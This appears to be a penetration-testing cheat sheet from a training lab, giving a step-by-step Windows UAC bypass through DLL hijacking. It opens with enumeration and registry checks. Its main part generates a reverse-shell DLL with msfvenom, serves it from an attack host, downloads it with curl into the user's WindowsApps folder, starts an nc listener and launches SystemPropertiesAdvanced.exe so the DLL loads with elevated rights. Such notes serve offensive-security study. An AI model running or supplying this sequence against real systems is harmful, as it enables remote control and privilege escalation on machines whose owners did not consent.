User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.

"Do you want to allow this app to make changes to your device?"

**UAC Bypasses
https://github.com/hfiref0x/UACME

**Checking Current User
```
whoami /user
```

**Confirming Admin Group Membership
```
net localgroup administrators
```

**Reviewing User Privileges
```
whoami /priv
```

**Confirming UAC is Enabled
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

**Checking UAC Level
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
- 0x5 is the highest level UAC which has "Always notify" enabled

**Checking Windows Version
```
[environment]::OSVersion.Version
```
- Use this cross-reference for Windows release: https://en.wikipedia.org/wiki/Windows_10_version_history


When attempting to locate a DLL, Windows will use the following search order:
1. The directory from which the application loaded.
2. The system directory C:\Windows\System32 for 64-bit systems.
3. The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.


**Reviewing Path Variable
```
cmd /c echo %PATH%
```

**Generating Malicious srrstr.dll DLL
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

**Starting Python HTTP Server on Attack Host
```
sudo python3 -m http.server 8080
```

**Downloading DLL Target
```
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

**Starting nc Listener on Attack Host
```
nc -lvnp 8443
```

**Testing Connection
```
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
- we get normal user rights

**Executing SystemPropertiesAdvanced.exe on Target Host
```
tasklist .svc | findstr "rundll32"
taskkill /PID 7044 /F
taskkill /PID 6300 /F
taskkill /PID 5360 /F
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
